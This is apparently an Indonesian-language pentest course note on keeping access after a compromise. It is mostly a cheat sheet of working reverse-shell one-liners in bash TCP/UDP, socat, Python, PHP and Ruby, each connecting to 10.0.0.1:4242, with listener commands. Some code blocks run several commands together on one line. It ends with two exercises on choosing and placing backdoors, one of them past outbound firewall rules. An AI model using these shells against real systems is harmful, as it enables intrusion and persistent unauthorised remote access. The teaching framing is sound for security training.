# Alternatif Reverse dan Bind Shell

Created: June 22, 2022 1:17 PM

Setelah melakukan fase hacking, agar bisa mempertahankan koneksi kita bisa membuat backconnect. Salah satu tool yang sering digunakan adalah netcat. Ada 2 jenis backconnect yaitu Reverse Shell dan Bind Shell.

# **Reverse Shell**

[https://lh3.googleusercontent.com/hNNDJiKGFNlmfDBoT2SkcDAMLRP31TYlttDb7RLDl7CcQyDL0vBQizwWb_PnNpjRgY-BBQn_W-gM5oWfvh0wiQfZI8HRf3xVW60yuiPcMuGW5kCN1hC5byxlZmds2GQur6ckZHMWxwjdiUKvkg](https://lh3.googleusercontent.com/hNNDJiKGFNlmfDBoT2SkcDAMLRP31TYlttDb7RLDl7CcQyDL0vBQizwWb_PnNpjRgY-BBQn_W-gM5oWfvh0wiQfZI8HRf3xVW60yuiPcMuGW5kCN1hC5byxlZmds2GQur6ckZHMWxwjdiUKvkg)

Berikut beberapa perintah yang dapat kita jalankan untuk mengaktifkan reverse shell.

**Bash TCP**

```bash
$ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1$ 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

**Bash UDP**

```bash
Victim:$ sh -i >& /dev/udp/10.0.0.1/4242 0>&1Listener:$ nc -u -lvp 4242
```

**Socat TCP**

```bash
Listener:user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242Victim:user@victim$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

**Python TCP**

```bash
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**PHP TCP**

```bash
$ php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
```

**Ruby TCP**

```bash
$ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

# **Exercises**

1. Suatu ketika kalian sedang melakukan penetration test secara internal perusahaan. Kalian melihat ada komputer server di ruang A dan tidak ada penjagaan. Beruntungnya komputer tersebut memiliki password yang lemah sehingga kalian bisa melewati proses login desktop. Setelah kalian periksa komputer tersebut terhubung ke jaringan internet dan LAN. Sayangnya komputer tersebut hanya memiliki IP Private. Jadi backdoor jenis apakah yang relevan dengan kondisi ini ? Jelaskan alasan kalian.
2. Terdapat sebuah komputer target yang memiliki infrastruktur yang lumayan ketat dimana terdapat firewall inbound dan firewall outbound. Firewall inbound melakukan block pada semua port sehingga orang lain tidak bisa mengakses komputer tersebut secara remote dari jaringan. Firewall outbound hanya mengizinkan komputer target untuk mengakses port 3306, 443, dan 22. Pada kasus ini bagaimana kalian merencanakan pemasangan backdoor agar bisa berjalan dengan baik ?